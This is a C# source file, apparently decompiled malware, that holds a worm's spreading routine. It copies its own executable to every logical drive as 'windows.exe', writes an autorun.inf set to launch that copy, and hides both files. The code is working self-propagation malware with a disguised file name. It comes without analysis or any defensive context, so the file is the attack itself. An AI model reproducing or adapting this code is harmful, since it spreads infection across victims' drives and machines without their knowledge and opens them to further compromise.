using System;
using System.IO;
using System.Reflection;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace ns0;

[StandardModule]
internal sealed class Class7
{
	public static void smethod_0()
	{
		string text = default(string);
		string[] logicalDrives = default(string[]);
		string[] array = default(string[]);
		int num = default(int);
		bool flag = default(bool);
		StreamWriter streamWriter = default(StreamWriter);
		Exception object_ = default(Exception);
		try
		{
			try
			{
				text = ((ServerComputer)Class3.Class2_0).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
				logicalDrives = Directory.GetLogicalDrives();
				array = logicalDrives;
				num = 0;
				while (flag = num < array.Length)
				{
					text = array[num];
					if (flag = !File.Exists(text + "windows.exe"))
					{
						File.Copy(Assembly.GetExecutingAssembly().Location, text + "windows.exe");
					}
					streamWriter = new StreamWriter(text + "autorun.inf");
					streamWriter.WriteLine("[autorun]");
					streamWriter.WriteLine("open = windows.exe");
					streamWriter.WriteLine("shellexecute=windows.exe");
					streamWriter.Close();
					File.SetAttributes(text + "autorun.inf", FileAttributes.Hidden);
					File.SetAttributes(text + "windows.exe", FileAttributes.Hidden);
					num = checked(num + 1);
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				object_ = ex;
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception exception_)
		{
			Class11.smethod_28(exception_, logicalDrives, text, streamWriter, object_, num, array, flag);
			throw;
		}
	}
}
